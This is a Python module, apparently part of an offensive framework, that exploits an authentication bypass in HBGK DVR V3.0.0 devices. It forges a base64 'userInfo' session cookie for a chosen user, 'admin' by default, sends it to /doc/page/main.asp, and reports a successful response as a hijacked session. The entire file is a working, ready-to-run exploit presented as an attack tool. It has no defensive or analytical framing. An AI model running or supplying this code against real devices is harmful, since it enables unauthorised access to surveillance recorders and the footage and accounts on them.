import httpx
import base64
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "hbgk_dvr_auth_bypass/device_rsp_attack"
        self.description = "HBGK DVR V3.0.0 Authentication Bypass Session Hijack Exploit."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"},
            "USER_TO_BYPASS": {"required": False, "value": "admin"} # Laisse le choix de cibler admin ou un autre utilisateur connu
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        user = self.options["USER_TO_BYPASS"]["value"]
        
        print(f"\033[1;31m[!] Launching attack payload loop: hbgk_dvr_auth_bypass/device_rsp_attack...\033[0m")
        
        url = f"http://{target}:{port}/doc/page/main.asp" if not target.startswith(("http://", "https://")) else f"{target.rstrip('/')}/doc/page/main.asp"
        
        # Forgeage du jeton d'authentification brisé
        raw_credentials = f"{user}:hunter2".encode('utf-8')
        b64_payload = base64.b64encode(raw_credentials).decode('utf-8')
        cookie_name = f"userInfo{port}"
        cookie_header_value = f"{cookie_name}={b64_payload}"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) dvr-framework/1.0",
            "Cookie": cookie_header_value
        }
        
        try:
            async with httpx.AsyncClient(timeout=8.0, verify=False, follow_redirects=False) as client:
                print(f"\033[1;33m[*] Forging arbitrary session tokens targeting username: '{user}'...\033[0m")
                response = await client.get(url, headers=headers)
                
                if response.status_code == 200:
                    details_report = (
                        f"Authentication bypassed successfully! Hijacked context for user: {user}\n"
                        f"  -> Target Endpoint: {url}\n"
                        f"  -> Generated Injection String: {cookie_header_value}\n"
                        f"  -> Execution Response Length: {len(response.text)} bytes."
                    )
                    return {
                        "success": True,
                        "details": details_report
                    }
        except Exception as e:
            return {"success": False, "error": str(e)}
        return {"success": False, "details": "Exploit executed but target device filtered or redirected the forged cookie structure."}
